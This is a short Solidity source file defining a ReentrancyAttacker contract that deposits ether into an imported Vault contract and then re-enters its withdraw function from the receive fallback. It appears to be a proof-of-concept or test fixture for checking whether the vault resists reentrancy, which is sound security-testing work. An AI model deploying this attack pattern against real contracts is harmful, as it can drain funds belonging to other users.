// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Vault.sol";

contract ReentrancyAttacker {
    Vault public vault;
    bool public attacking;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        require(msg.value > 0);
        vault.deposit{value: msg.value}();
        attacking = true;
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (attacking) {
            // try to reenter
            vault.withdraw(msg.value);
        }
    }
}
